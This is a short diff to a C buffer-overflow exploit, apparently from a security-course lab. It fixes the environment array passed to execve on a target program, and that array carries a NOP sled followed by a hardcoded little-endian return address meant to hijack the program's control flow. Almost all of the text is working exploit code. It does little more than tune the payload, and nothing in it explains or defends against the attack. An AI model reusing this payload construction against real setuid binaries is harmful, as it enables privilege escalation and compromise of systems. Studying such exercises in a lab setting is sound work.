@@ -12,7 +12,7 @@ int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
-	char *	env[4];
+	char *	env[5];
 
 	char sploit_str[284];
 
@@ -51,7 +51,8 @@ main ( int argc, char * argv[] )
 	// 271
 	env[2] = "\x00";
 	// Hardcode little Endian target address with NOP (need 8 to reach 280 and then 4 more bytes for target address) 
-	env[3] = "\x90\x90\x90\x90\x90\x90\x90\x90\x80\xfd\x21\x20\x00";
+	env[3] = "\x90\x90\x90\x90\x90\x90\x90\x90\x80\xfd\x21\x20";
+	env[4] = NULL;
 
 	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
